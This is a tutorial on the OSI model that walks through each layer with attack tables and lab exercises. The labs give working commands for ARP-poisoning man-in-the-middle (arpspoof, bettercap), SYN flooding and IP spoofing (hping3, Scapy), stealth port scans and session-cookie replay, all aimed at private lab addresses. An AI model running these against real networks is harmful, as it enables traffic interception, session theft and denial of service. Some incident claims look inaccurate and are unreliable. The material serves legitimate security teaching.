# OSI Model: Deep Dive for DevOps, Cybersecurity & Cloud Engineers

> **Lab Environment Disclaimer:** All attack demonstrations and offensive techniques described here are intended for use in controlled environments (your own VMs, intentionally vulnerable systems like Metasploitable, TryHackMe, HackTheBox). Never attempt these on systems you don't own or have explicit written permission to test.

---

## Table of Contents

1. [What is the OSI Model? (Layman's Terms)](#1-what-is-the-osi-model)
2. [Real-World Analogy](#2-real-world-analogy)
3. [Formal Definition](#3-formal-definition)
4. [How Data Travels: End-to-End Example](#4-how-data-travels-end-to-end-example)
5. [Layer 1 – Physical](#layer-1--physical-layer)
6. [Layer 2 – Data Link](#layer-2--data-link-layer)
7. [Layer 3 – Network](#layer-3--network-layer)
8. [Layer 4 – Transport](#layer-4--transport-layer)
9. [Layer 5 – Session](#layer-5--session-layer)
10. [Layer 6 – Presentation](#layer-6--presentation-layer)
11. [Layer 7 – Application](#layer-7--application-layer)
12. [OSI vs TCP/IP Model](#osi-vs-tcpip-model)
13. [Attack Surface Summary Table](#attack-surface-summary-table)
14. [Hands-On Lab Setup](#hands-on-lab-setup)
15. [Best Practices & Pro Tips](#best-practices--pro-tips)

---

## 1. What is the OSI Model?

### Layman's Terms

Imagine you want to send a handwritten letter to your friend in another city. You don't just teleport the letter — it goes through a process: you write it → put it in an envelope → write the address → give it to the post office → they sort it → a courier carries it → it arrives at your friend's door → they open it → they read it.

The **OSI Model** is exactly this — a **7-step framework** that describes how data travels from one computer to another over a network. Each step (layer) has a specific job. When you send data, it goes **down** all 7 layers (adding information at each step). When the other side receives it, it goes **back up** all 7 layers (stripping information at each step).

This layered approach means:
- Each layer only talks to the layer directly above and below it
- You can troubleshoot problems layer by layer ("Is this a cable issue? A routing issue? An application issue?")
- Different vendors can build products that work together as long as they follow the same layer rules

---

## 2. Real-World Analogy

### The Postal System Analogy

| OSI Layer | Postal Equivalent |
|-----------|------------------|
| 7 – Application | You write the letter (the actual content/message) |
| 6 – Presentation | You write in a language your friend understands (encoding) |
| 5 – Session | You agree on a conversation: "I'll send 3 letters, reply to each" |
| 4 – Transport | You split a long message into multiple envelopes, number them |
| 3 – Network | You write the destination city & zip code (routing address) |
| 2 – Data Link | The local post office labels the envelope for the next local truck |
| 1 – Physical | The truck physically drives the envelope down the road |

### Real-World Events That Highlight Each Layer

- **Layer 1 Physical Attack (2013 – South Africa):** Copper cable thieves cut fiber and copper cables, bringing down entire telecom networks — a pure Layer 1 attack.
- **Layer 2 ARP Poisoning (Multiple incidents):** Attackers on hotel Wi-Fi used ARP spoofing to intercept all guests' traffic — happened extensively at Black Hat conferences.
- **Layer 3 BGP Hijacking (2010):** China Telecom accidentally (or intentionally) rerouted 15% of internet traffic through Chinese servers for 18 minutes — a Layer 3 routing attack.
- **Layer 4 SYN Flood (GitHub 2018):** GitHub was hit with a 1.35 Tbps DDoS using SYN floods and memcached amplification — the largest DDoS at the time.
- **Layer 7 SQL Injection (Yahoo 2012):** 450,000 credentials stolen using SQL injection — a pure Layer 7 application attack.

---

## 3. Formal Definition

The **Open Systems Interconnection (OSI) model** is a conceptual framework developed by the **International Organization for Standardization (ISO)** in **1984** (published as ISO/IEC 7498-1). It standardizes the functions of a telecommunication or computing system into **seven abstraction layers**, enabling diverse communication systems to communicate using standard protocols. Each layer serves the layer above it and is served by the layer below it, following the principle of **encapsulation** (adding headers/trailers) on the way down and **decapsulation** (removing headers/trailers) on the way up.

**Encapsulation terminology per layer:**

| Layer | Data Unit Name (PDU) |
|-------|---------------------|
| 7 – Application | Data / Message |
| 6 – Presentation | Data |
| 5 – Session | Data |
| 4 – Transport | Segment (TCP) / Datagram (UDP) |
| 3 – Network | Packet |
| 2 – Data Link | Frame |
| 1 – Physical | Bits |

---

## 4. How Data Travels: End-to-End Example

**Scenario:** You type `https://192.168.1.100` in your browser (your machine: `192.168.1.50`) and request a webpage from a web server on your local network.

```
YOUR MACHINE (192.168.1.50)                    WEB SERVER (192.168.1.100)
─────────────────────────────                  ─────────────────────────────
[L7] Browser sends HTTP GET /index.html  ──►   [L7] Web server receives HTTP request
[L6] Data encoded as UTF-8/TLS encrypted ──►   [L6] Data decrypted, decoded
[L5] Session established (TLS handshake) ──►   [L5] Session tracked, managed
[L4] Split into TCP Segments, port 443   ──►   [L4] Segments reassembled, port 443
[L3] IP Packet: src=192.168.1.50         ──►   [L3] Packet received at 192.168.1.100
     dst=192.168.1.100
[L2] Ethernet Frame: src MAC=AA:BB:CC    ──►   [L2] Frame stripped, MAC verified
     dst MAC=DD:EE:FF
[L1] Electrical signals over Cat6 cable  ──►   [L1] Signals received, bits decoded
```

**What each layer actually adds (encapsulation stack):**

```
┌─────────────────────────────────────────────────────────────┐
│  L7 Header │  L6 Header │  L5 Header │                      │
│    HTTP    │    TLS     │  Session   │  APPLICATION DATA    │
│   Header   │   Record   │   Token    │  "GET /index.html"   │
├─────────────────────────────────────────────────────────────┤
│   L4 TCP Header (src port 54231, dst port 443, seq#, ack#)  │
├─────────────────────────────────────────────────────────────┤
│   L3 IP Header (src 192.168.1.50, dst 192.168.1.100, TTL)   │
├─────────────────────────────────────────────────────────────┤
│  L2 Ethernet Header (src MAC, dst MAC)  │  ...data...  │FCS │
├─────────────────────────────────────────────────────────────┤
│   L1: 01001000 01100101 ... (raw bits/electrical signals)   │
└─────────────────────────────────────────────────────────────┘
```

---

## Layer 1 – Physical Layer

### Layman's Terms
This is the actual wire, light beam, or radio wave carrying your data. It has no idea what the data means — it just moves raw **bits (1s and 0s)** from point A to point B.

### Formal Definition
The Physical Layer defines the electrical, mechanical, procedural, and functional specifications for activating, maintaining, and deactivating physical links between systems. It deals with transmission of raw bit streams over a physical medium.

### Key Responsibilities
- Bit encoding (NRZ, Manchester, 4B/5B)
- Signal modulation and demodulation
- Data rate / bandwidth control
- Synchronization of bits
- Physical topology (bus, star, mesh, ring)
- Transmission mode (simplex, half-duplex, full-duplex)

### Devices at Layer 1

| Device | Role |
|--------|------|
| **Hub** | Broadcasts bits to all ports (dumb repeater) |
| **Repeater** | Amplifies/regenerates signal over long distances |
| **Modem** | Modulates/demodulates analog ↔ digital |
| **Network Interface Card (NIC)** | Converts digital data to signals |
| **Cables** | Cat5e, Cat6, Cat6a, Fiber (Single-mode, Multi-mode) |
| **Wireless Access Point (radio)** | Converts bits to radio waves (Wi-Fi) |

### Protocols / Standards at Layer 1

| Standard | Description |
|----------|-------------|
| **IEEE 802.3** | Ethernet physical specifications |
| **IEEE 802.11** | Wi-Fi (a/b/g/n/ac/ax) |
| **USB** | Serial physical connection |
| **Bluetooth (IEEE 802.15.1)** | Short-range wireless |
| **DSL / ISDN** | Telephone line data transmission |
| **SONET/SDH** | Fiber optic synchronous transmission |
| **RS-232** | Serial communication standard |

### Attacks at Layer 1

| Attack | Description | Real-World Impact |
|--------|-------------|-------------------|
| **Cable Tapping / Wiretapping** | Physical tap on copper/fiber to intercept data | NSA PRISM program intercepted fiber backbone cables |
| **Signal Jamming** | Flooding frequencies to disrupt Wi-Fi/cellular | Used in electronic warfare; can kill drones mid-flight |
| **Hardware Keyloggers** | Physical device plugged in between keyboard and PC | Common in hotel lobbies, ATMs |
| **Evil USB Drop Attack** | Malicious USB left in parking lot | US DoD study: 60% of dropped USBs were plugged in by employees |
| **Cable Cutting (Sabotage)** | Physical destruction of network infrastructure | Vandals cutting fiber brings down entire ISPs |
| **Optical Tap** | Bending fiber to leak light for interception | Near-undetectable; used in nation-state espionage |
| **Electromagnetic Inteference** | EMI from other electriv devices can disrupt signals | Leads to distorted message at receiver end |

### Hands-On Lab: Physical Layer Observation

**Objective:** See raw bits and signal timing using Wireshark at the lowest capture level.

**Setup Required:** 2 VMs on same virtual network (e.g., VirtualBox NAT Network)

```bash
# On Kali Linux VM - install Wireshark
sudo apt update && sudo apt install wireshark -y

# Capture traffic at the NIC level (closest to L1 we can get in software)
sudo wireshark &

# In Wireshark: select your interface (eth0), start capture
# Then from another terminal, send a ping:
ping 192.168.1.100

# Observe the raw byte-level capture in Wireshark
# Click any packet → look at the bottom hex dump = this is L1 data representation
```

**What you'll see:** Ethernet frames as raw hex bytes — this hex dump is what physically travels as voltage changes on the wire.

### Best Way to Secure Layer 1 (That Will Never Fail)
1. **Physical access control** — If an attacker touches your hardware, game over. Use locked server rooms, cable locks, and tamper-evident seals.
2. **Disable unused physical ports** — In Cisco: `interface fa0/1 → shutdown`
3. **Use fiber over copper** — Fiber is much harder to tap (requires precision bending)
4. **Port security on switches** — Limit MAC addresses per port
5. **Monitor for signal anomalies** — Optical Time Domain Reflectometers (OTDR) detect fiber taps

---

## Layer 2 – Data Link Layer

### Layman's Terms
This layer is like your **local neighborhood post office**. It knows how to get a letter from one house to another *on the same street* (same local network). It uses **MAC addresses** (like house numbers) instead of full postal addresses.

### Formal Definition
The Data Link Layer provides node-to-node data transfer between two directly connected nodes. It handles physical addressing (MAC addresses burned into device's NIC card), error detection via Frame Check Sequence (FCS/CRC), flow control, and access control to the shared medium(like ethernet when two devices transmit data simultaneously...acheived through CSMA/CD). It is divided into two sublayers: **LLC (Logical Link Control)** and **MAC (Media Access Control)**.

### Key Responsibilities
- Framing (adding L2 header/trailer to packets)
- Physical addressing (MAC addresses)
- Error detection (CRC/FCS)
- Flow control between adjacent nodes
- Media Access Control (CSMA/CD for Ethernet, CSMA/CA for Wi-Fi)
- VLAN tagging (802.1Q)...VLAN allows logical segmentation of physical network into multiple broadcast domains.

### Devices at Layer 2

| Device | Role |
|--------|------|
| **Switch** | Forwards frames based on MAC address table |
| **Hub** | Can be thought of a dumber version of switch(broadcasts to all devices) |
| **Bridge** | Connects two network segments at L2 |
| **Wireless AP (L2 function)** | Associates clients, handles 802.11 frames |
| **NIC (L2 function)** | Assigns/uses MAC address |

### Protocols at Layer 2

| Protocol | Description |
|----------|-------------|
| **Ethernet (IEEE 802.3)** | Dominant wired LAN protocol |
| **ARP** | Resolves IP addresses to MAC addresses |
| **STP (802.1D)** | Spanning Tree Protocol — prevents L2 loops |
| **RSTP (802.1w)** | Rapid STP |
| **802.1Q** | VLAN tagging |
| **802.1X** | Port-based Network Access Control (NAC) |
| **PPP** | Point-to-Point Protocol (WAN links) |
| **HDLC** | High-Level Data Link Control |
| **CDP/LLDP** | Cisco/standard device discovery protocols |

### MAC Address Deep Dive

```
MAC Address format:  AA:BB:CC:DD:EE:FF
                     ──────── ────────
                     OUI      Device-specific
                  (Manufacturer)

First 3 bytes = OUI (Organizationally Unique Identifier)
Examples:
  00:50:56 = VMware
  00:1A:2B = Cisco
  DC:A6:32 = Raspberry Pi Foundation

Broadcast MAC: FF:FF:FF:FF:FF:FF (sent to ALL devices on segment)
```

### Attacks at Layer 2

| Attack | Description | Tool |
|--------|-------------|------|
| **ARP Spoofing/Poisoning** | Fake ARP replies trick devices into sending traffic to attacker (MITM) | `arpspoof`, `ettercap`, `bettercap` |
| **MAC Flooding** | Flood switch with fake MACs, overload CAM table, switch acts like hub | `macof` (dsniff) |
| **VLAN Hopping** | Access VLANs you shouldn't by double-tagging or trunk negotiation | `yersinia` |
| **STP Attack** | Send fake BPDU to become Root Bridge, redirect all traffic | `yersinia` |
| **MAC Spoofing** | Change your MAC to impersonate another device | `macchanger` |
| **CAM Table Overflow** | Same as MAC flooding; forces unicast flooding | `macof` |
| **Evil Twin AP** | Fake access point to capture Wi-Fi credentials | `hostapd-wpe`, `airbase-ng` |

### Hands-On Lab: ARP Spoofing (MITM Attack)

**Environment needed:** 3 VMs: Kali (attacker), Ubuntu (victim), Ubuntu (gateway/server)

**Topology:**
```
Victim (192.168.1.10)  ←→  Switch  ←→  Gateway (192.168.1.1)
                              ↑
                        Kali (192.168.1.50) ← ATTACKER
```

**Step 1: Enable IP forwarding on Kali (so traffic flows through you)**
```bash
echo 1 | sudo tee /proc/sys/net/ipv4/ip_forward
# Or permanently:
sudo sysctl -w net.ipv4.ip_forward=1
```

**Step 2: Verify network before attack**
```bash
# On victim - check ARP table
arp -a
# Should show: 192.168.1.1 at (gateway's real MAC)
```

**Step 3: Launch ARP Poison using arpspoof**
```bash
# Terminal 1 - Poison victim to think attacker IS the gateway
sudo arpspoof -i eth0 -t 192.168.1.10 192.168.1.1

# Terminal 2 - Poison gateway to think attacker IS the victim
sudo arpspoof -i eth0 -t 192.168.1.1 192.168.1.10
```

**Step 4: Capture intercepted traffic**
```bash
# Terminal 3 - Sniff the traffic flowing through us
sudo tcpdump -i eth0 -w /tmp/captured.pcap

# Or use Wireshark for live view
sudo wireshark &
```

**Step 5: Verify on victim**
```bash
# Victim now shows attacker's MAC for gateway IP - MITM SUCCESSFUL
arp -a
# Shows: 192.168.1.1 at AA:BB:CC:DD:EE:FF (Kali's MAC ← WRONG!)
```

**Step 6: Use bettercap for modern MITM with more features**
```bash
sudo apt install bettercap -y
sudo bettercap -iface eth0

# In bettercap console:
> net.probe on
> net.show
> set arp.spoof.targets 192.168.1.10
> arp.spoof on
> net.sniff on
```

### Best Way to Defend Layer 2 (That Will Never Fail)
1. **Dynamic ARP Inspection (DAI)** on managed switches — validates ARP packets
2. **802.1X port authentication** — no auth = no network access
3. **DHCP Snooping** — builds trusted binding table, prevents rogue DHCP servers
4. **VLAN segmentation** — isolate sensitive systems in separate VLANs
5. **Port security** — limit MACs per switch port, enable sticky MAC
6. **Disable DTP (Dynamic Trunking Protocol)** on access ports: `switchport nonegotiate`

---

## Layer 3 – Network Layer

### Layman's Terms
This is the **GPS navigation** of networking. While Layer 2 handles "get to the next street corner," Layer 3 handles "route across the entire country." It uses **IP addresses** and makes decisions about the best path between networks.

### Formal Definition
The Network Layer provides logical addressing, routing, and path determination for data packets across multiple networks. It is responsible for packet forwarding, including routing through intermediate routers, and handles logical addressing (IPv4/IPv6), fragmentation, and reassembly of packets.

### Key Responsibilities
- Logical addressing (IPv4 / IPv6)
- Routing — determining the best path
- Packet forwarding
- Fragmentation and reassembly (MTU handling)
- TTL (Time to Live) management
- ICMP (error reporting and diagnostics)

### Devices at Layer 3

| Device | Role |
|--------|------|
| **Router** | Routes packets between networks based on IP |
| **Layer 3 Switch** | Switch with routing capabilities |
| **Firewall (stateful)** | Filters packets at L3/L4 |
| **Load Balancer (L3 mode)** | Distributes traffic based on IP |
| **VPN Gateway** | Encapsulates/routes encrypted tunnels |

### Protocols at Layer 3

| Protocol | Description |
|----------|-------------|
| **IPv4** | 32-bit addressing, still dominant |
| **IPv6** | 128-bit addressing, expanding adoption |
| **ICMP** | Ping, traceroute, error messages |
| **ICMPv6** | IPv6 version (also handles NDP — replaces ARP) |
| **OSPF** | Open Shortest Path First (link-state IGP) |
| **EIGRP** | Cisco's Enhanced Interior Gateway Routing Protocol |
| **BGP** | Border Gateway Protocol (internet's backbone routing) |
| **RIP** | Routing Information Protocol (legacy) |
| **IPsec** | IP security — encryption at L3 (used in VPNs) |
| **GRE** | Generic Routing Encapsulation (tunnel protocol) |

### IPv4 Deep Dive for Security Engineers

```
IPv4 Header Structure:
 0                   1                   2                   3
 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
|Version|  IHL  |Type of Service|          Total Length         |
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
|         Identification        |Flags|      Fragment Offset    |
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
|  Time to Live |    Protocol   |         Header Checksum       |
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
|                       Source Address                          |
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
|                    Destination Address                        |
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+

Important fields for security:
- TTL: Decremented at each hop. Reaches 0 = packet dropped. Used in traceroute.
- Protocol: 6=TCP, 17=UDP, 1=ICMP, 47=GRE, 50=ESP (IPsec)
- Flags: DF (Don't Fragment), MF (More Fragments) — used in fragmentation attacks
- Identification + Fragment Offset: Used to reassemble fragments — abused in attacks
```

### Attacks at Layer 3

| Attack | Description | Tool |
|--------|-------------|------|
| **IP Spoofing** | Forge source IP in packet headers | `hping3`, `scapy` |
| **ICMP Redirect Attack** | Send fake ICMP redirects to reroute traffic | `hping3`, custom scripts |
| **Smurf Attack** | Spoof victim IP, broadcast ping → amplified flood | Legacy, mostly mitigated |
| **Ping of Death** | Oversized ICMP packets to crash systems | Legacy, patched |
| **IP Fragmentation Attack** | Send malformed fragments to crash/bypass firewalls | `fragroute` |
| **TTL Manipulation** | Craft packets with specific TTLs to evade IDS | `scapy` |
| **BGP Hijacking** | Announce false BGP routes to steal IP blocks | Requires BGP router access |
| **Traceroute/Network Mapping** | Use ICMP/UDP TTL expiry to map network topology | `traceroute`, `nmap` |
| **OSPF Route Injection** | Inject fake OSPF LSAs to manipulate routing tables | `loki` |

### Hands-On Lab: Network Reconnaissance with Nmap + Scapy

**Step 1: Host discovery (ping sweep)**
```bash
# ICMP ping sweep of entire subnet
nmap -sn 192.168.1.0/24

# If ICMP is blocked, try ARP discovery (L2 + L3)
nmap -sn -PR 192.168.1.0/24
```

**Step 2: OS fingerprinting using TTL values**
```bash
# Different OSes have different default TTLs:
# Linux = 64, Windows = 128, Cisco = 255, Solaris = 255

ping 192.168.1.100
# TTL=64 → Linux/Mac
# TTL=128 → Windows

# Nmap OS detection
sudo nmap -O 192.168.1.100
```

**Step 3: Craft custom ICMP packets with Scapy**
```bash
sudo apt install python3-scapy -y
sudo scapy

# Inside scapy shell:
>>> pkt = IP(dst="192.168.1.100", ttl=1) / ICMP()
>>> send(pkt)
# Watch for TTL exceeded response (this is how traceroute works!)

# Traceroute manually with Scapy:
>>> ans, unans = sr(IP(dst="8.8.8.8", ttl=(1,15)) / UDP(dport=53), timeout=2)
>>> ans.summary()
```

**Step 4: Simulate IP spoofing (send ping from fake source)**
```bash
sudo scapy
>>> pkt = IP(src="10.0.0.1", dst="192.168.1.100") / ICMP()
>>> send(pkt)
# 192.168.1.100 will reply to 10.0.0.1, not to you
# This is the basis of reflection/amplification DDoS attacks
```

### Best Way to Defend Layer 3 (That Will Never Fail)
1. **BCP38 / Ingress filtering** — ISPs/routers should drop packets with spoofed source IPs
2. **ICMP rate limiting** — limit ICMP to prevent ping floods and map discovery
3. **BGP Route Origin Authorization (ROA)** with RPKI — prevents BGP hijacking
4. **Implement ACLs** — deny RFC1918 addresses from public-facing interfaces
5. **Use IPsec** for all inter-site communication (encrypts + authenticates at L3)
6. **Segment with firewalls** — stateful inspection to track connection state

---

## Layer 4 – Transport Layer

### Layman's Terms
This layer is the **shipping department** of networking. It decides whether to send your package via **express guaranteed delivery (TCP)** or **cheap untracked shipping (UDP)**. It also labels which "window" at the post office (port number) the package is headed to.

### Formal Definition
The Transport Layer provides end-to-end communication services for applications. It offers reliable (TCP) or best-effort (UDP) delivery, multiplexing via port numbers, flow control, congestion control, and (with TCP) connection establishment/termination via a three-way handshake.

### TCP vs UDP — Deep Comparison

```
TCP (Transmission Control Protocol):         UDP (User Datagram Protocol):
────────────────────────────────────         ────────────────────────────
✓ Connection-oriented (3-way handshake)      ✓ Connectionless (fire and forget)
✓ Reliable (ACK, retransmission)             ✗ No delivery guarantee
✓ Ordered delivery (sequence numbers)        ✗ No ordering
✓ Flow control (sliding window)              ✓ Very low overhead
✓ Congestion control                         ✓ No connection setup delay
✗ Higher overhead                            ✓ Supports broadcast/multicast
Use: HTTP, HTTPS, SSH, FTP, SMTP             Use: DNS, DHCP, VoIP, Video, Gaming

TCP Header (20 bytes minimum):
 Source Port (16) | Destination Port (16)
 Sequence Number (32)
 Acknowledgment Number (32)
 Data Offset | Reserved | Flags | Window Size
 Checksum | Urgent Pointer

TCP Flags (critical for attack analysis):
  SYN  = Synchronize (connection init)
  ACK  = Acknowledge
  FIN  = Finish (graceful close)
  RST  = Reset (abrupt close / port closed)
  PSH  = Push data immediately
  URG  = Urgent data
  ECE  = ECN-Echo
  CWR  = Congestion Window Reduced
```

### TCP Three-Way Handshake

```
Client (192.168.1.50)              Server (192.168.1.100:443)
        │                                   │
        │──── SYN (seq=100) ───────────────►│
        │                                   │
        │◄─── SYN-ACK (seq=300, ack=101) ───│
        │                                   │
        │──── ACK (seq=101, ack=301) ──────►│
        │                                   │
        │         Connection Established    │
        │                                   │
        │──── FIN ─────────────────────────►│  Teardown
        │◄─── FIN-ACK ───────────────────── │
        │──── ACK ─────────────────────────►│
```

### Common Ports Reference (Essential for Pentesters)

| Port | Protocol | Service | Notes |
|------|----------|---------|-------|
| 21   | TCP | FTP | Clear-text, easy to sniff |
| 22   | TCP | SSH | Encrypted; brute-force target |
| 23   | TCP | Telnet | Clear-text; should never be used |
| 25   | TCP | SMTP | Email sending; relay abuse |
| 53   | TCP/UDP | DNS | DNS tunneling, cache poisoning |
| 80   | TCP | HTTP | Unencrypted web |
| 110  | TCP | POP3 | Email retrieval |
| 143  | TCP | IMAP | Email; clear-text by default |
| 443  | TCP | HTTPS | Encrypted web |
| 445  | TCP | SMB | EternalBlue target (MS17-010) |
| 1433 | TCP | MSSQL | Database |
| 3306 | TCP | MySQL | Database |
| 3389 | TCP | RDP | Remote desktop; BlueKeep target |
| 8080 | TCP | HTTP-alt | Dev/proxy servers |
| 8443 | TCP | HTTPS-alt | Alternate HTTPS |

### Attacks at Layer 4

| Attack | Description | Tool |
|--------|-------------|------|
| **SYN Flood** | Send millions of SYN packets, never complete handshake, exhaust server's connection table | `hping3`, `nmap --script` |
| **TCP Session Hijacking** | Guess/predict sequence numbers to inject into existing TCP session | `ettercap`, `hunt` |
| **UDP Flood** | Flood target with UDP packets to exhaust bandwidth/resources | `hping3 -2` |
| **Port Scanning** | Enumerate open ports to map attack surface | `nmap` |
| **Null/FIN/Xmas Scan** | Stealthy scans using unusual TCP flag combos to bypass firewalls | `nmap -sN/sF/sX` |
| **RST Injection** | Send forged TCP RST to kill existing connections | `hping3`, `scapy` |
| **UDP Amplification DDoS** | Small UDP request → large response → redirect to victim | NTP, DNS, Memcached |

### Hands-On Lab: Port Scanning & SYN Flood Simulation

**Lab Setup:** Kali (attacker) → Metasploitable2 (victim at 192.168.1.200)

**Step 1: Full port scan with service detection**
```bash
# Full TCP SYN scan, service version, OS detection
sudo nmap -sS -sV -O -p- 192.168.1.200

# Explanation of flags:
# -sS = SYN scan (stealth, half-open - doesn't complete handshake)
# -sV = Service/version detection
# -O  = OS fingerprinting
# -p- = ALL 65535 ports

# Fast scan common ports with scripts
sudo nmap -sC -sV -A 192.168.1.200
```

**Step 2: Different scan types and what they reveal**
```bash
# TCP Connect scan (full handshake, logged)
nmap -sT 192.168.1.200

# UDP scan (slower but finds hidden services)
sudo nmap -sU --top-ports 100 192.168.1.200

# Null scan (no flags - FW bypass technique)
sudo nmap -sN 192.168.1.200

# FIN scan (only FIN flag)
sudo nmap -sF 192.168.1.200

# Xmas scan (FIN+PSH+URG set - "lit up like a Christmas tree")
sudo nmap -sX 192.168.1.200
```

**Step 3: Simulate SYN flood with hping3**
```bash
# Send 10,000 SYN packets to port 80 with random source IPs
sudo hping3 -S -p 80 --flood --rand-source 192.168.1.200

# Watch the target's connection table fill up:
# On victim:
watch -n 1 'ss -tan | grep SYN_RECV | wc -l'

# Ctrl+C to stop attack
```

**Step 4: Capture and analyze with Wireshark filter**
```
# Wireshark display filters for L4 analysis:
tcp.flags.syn == 1 && tcp.flags.ack == 0    # All SYN packets (scan/flood detection)
tcp.flags.rst == 1                           # RST packets (closed ports)
tcp.flags == 0x001                           # FIN only (FIN scans)
tcp.flags == 0x029                           # Xmas scan (FIN+PSH+URG)
udp && !dns                                  # UDP traffic excluding DNS
```

### Best Way to Defend Layer 4 (That Will Never Fail)
1. **SYN Cookies** — enable on Linux: `sysctl -w net.ipv4.tcp_syncookies=1`
2. **Stateful firewall** — track connection states; drop packets not belonging to established sessions
3. **Rate limiting per IP** — `iptables -A INPUT -p tcp --syn -m limit --limit 1/s -j ACCEPT`
4. **Close unused ports** — run `ss -tlnp` and kill unnecessary services
5. **Intrusion Detection System (Snort/Suricata)** — detect port scans and flood patterns
6. **DDoS protection upstream** — BGP anycast scrubbing (Cloudflare, Akamai)

---

## Layer 5 – Session Layer

### Layman's Terms
This layer is the **conversation manager**. When you and a friend are on a video call, someone has to keep track of "we're in an active call right now." If the call drops, who reconnects? Who decides when the call is over? That's the Session layer.

### Formal Definition
The Session Layer establishes, manages, and terminates sessions (logical connections) between communicating systems. It provides services for dialog control (half-duplex vs full-duplex), synchronization (checkpointing for recovery), and session multiplexing.

### Key Responsibilities
- Session establishment, maintenance, termination
- Dialog control (who speaks when)
- Synchronization points (checkpoints for recovery)
- Session restoration after failure

### Protocols at Layer 5

| Protocol | Description |
|----------|-------------|
| **NetBIOS** | Session services for Windows networking |
| **RPC (Remote Procedure Call)** | Enables programs to call procedures on remote systems |
| **PPTP** | Point-to-Point Tunneling Protocol (VPN, deprecated) |
| **L2TP** | Layer 2 Tunneling Protocol |
| **SMB** | Server Message Block (Windows file sharing) |
| **NFS** | Network File System (Unix file sharing) |
| **SQL** | Database session management |
| **H.245** | Multimedia session control |
| **SIP** | Session Initiation Protocol (VoIP calls) |

### Attacks at Layer 5

| Attack | Description | Tool |
|--------|-------------|------|
| **Session Hijacking** | Steal/forge session token to take over authenticated session | `hamster` + `ferret`, Burp Suite |
| **Session Fixation** | Force victim to use attacker-known session ID | Manual/Burp Suite |
| **SMB Session Exploitation** | Exploit SMB session handling (EternalBlue = MS17-010) | `metasploit` |
| **RPC Exploits** | Target vulnerable RPC endpoints | `msrpc` enum, Metasploit |
| **Brute Force Sessions** | Guess session tokens with low entropy | `hydra`, custom scripts |
| **Replay Attack** | Capture and re-send valid session data | `mitmproxy` |

### Session Tokens in Practice (Web Context)

```
Browser Request:
GET /dashboard HTTP/1.1
Host: 192.168.1.100
Cookie: PHPSESSID=abc123def456  ← THIS IS THE SESSION TOKEN
                                   If attacker gets this cookie,
                                   they ARE you to the server!

Attack Flow (Session Hijacking over HTTP):
1. Victim logs into http://192.168.1.100
2. Server issues PHPSESSID=abc123def456
3. Attacker sniffs cookie via ARP spoof + tcpdump
4. Attacker injects cookie: curl -b "PHPSESSID=abc123def456" http://192.168.1.100/dashboard
5. Server thinks attacker = authenticated user
```

### Hands-On Lab: Session Token Analysis

**Using DVWA (Damn Vulnerable Web App) — set up with Docker:**

```bash
# Setup DVWA
docker run --rm -it -p 80:80 vulnerables/web-dvwa

# Access at http://localhost/
# Default creds: admin / password
# Set security to "low"

# Open Wireshark, filter: http.cookie
# Log in, capture the PHPSESSID in plain HTTP
# Try to reuse that session in a different browser/window

# Or use curl to replay the session:
curl -v -b "PHPSESSID=YOUR_CAPTURED_TOKEN; security=low" \
  http://localhost/vulnerabilities/sqli/
```

---

## Layer 6 – Presentation Layer

### Layman's Terms
Think of this as the **translator and security guard** of the network. If two people speak different languages, they need a translator (encoding). If they're exchanging secret documents, they need encryption (the security guard checks the documents are sealed before handing over).

### Formal Definition
The Presentation Layer is responsible for the translation, encryption/decryption, and compression of data. It ensures that data from the Application Layer of one system can be read by the Application Layer of another by translating between different data formats and character encodings.

### Key Responsibilities
- Data translation (ASCII ↔ EBCDIC, etc.)
- Serialization/Deserialization (JSON, XML, Protobuf)
- Encryption and decryption (SSL/TLS lives here conceptually)
- Data compression
- Character encoding (UTF-8, UTF-16, Base64)

### Protocols / Standards at Layer 6

| Standard | Description |
|----------|-------------|
| **SSL/TLS** | Transport Layer Security (encryption) |
| **JPEG/PNG/GIF** | Image encoding standards |
| **ASCII/UTF-8/Unicode** | Character encoding |
| **MIME** | Multipurpose Internet Mail Extensions |
| **XDR** | External Data Representation |
| **ASN.1** | Abstract Syntax Notation (used in X.509 certs) |
| **Base64** | Binary-to-text encoding |

### Attacks at Layer 6

| Attack | Description | Tool |
|--------|-------------|------|
| **SSL Stripping** | Downgrade HTTPS to HTTP — strip encryption from connection | `sslstrip`, `bettercap` |
| **Weak Cipher Exploitation** | Exploit servers using outdated ciphers (RC4, DES, 3DES) | `testssl.sh`, `nmap --script ssl-enum-ciphers` |
| **POODLE** | Padding Oracle On Downgraded Legacy Encryption (SSL 3.0 exploit) | Metasploit |
| **BEAST** | Browser Exploit Against SSL/TLS (TLS 1.0 CBC mode) | Historical |
| **Certificate Spoofing** | Present fake SSL cert (usually with ARP spoof for MITM) | `mitmproxy`, `sslsplit` |
| **Heartbleed (CVE-2014-0160)** | OpenSSL memory leak — read server memory via TLS heartbeat | `heartbleed` scanner |
| **Insecure Deserialization** | Send malformed serialized objects to trigger code execution | `ysoserial`, Burp Suite |

### Hands-On Lab: TLS/SSL Analysis

```bash
# Check what TLS versions and ciphers a server supports
testssl.sh 192.168.1.100

# Nmap SSL cipher enumeration
nmap --script ssl-enum-ciphers -p 443 192.168.1.100

# Check certificate details
openssl s_client -connect 192.168.1.100:443 2>/dev/null | openssl x509 -noout -text

# Scan for known SSL vulnerabilities
nmap --script ssl-heartbleed -p 443 192.168.1.100
nmap --script ssl-poodle -p 443 192.168.1.100

# View TLS handshake in Wireshark:
# Filter: tls.handshake
# Look for: Client Hello, Server Hello, Certificate, Key Exchange
```

---

## Layer 7 – Application Layer

### Layman's Terms
This is the layer you **actually interact with** — your browser, email client, and apps live here. When you type a URL, it's the Application layer that says "go fetch that web page using HTTP." All the layers below just carry the request — this layer defines *what* you're asking for.

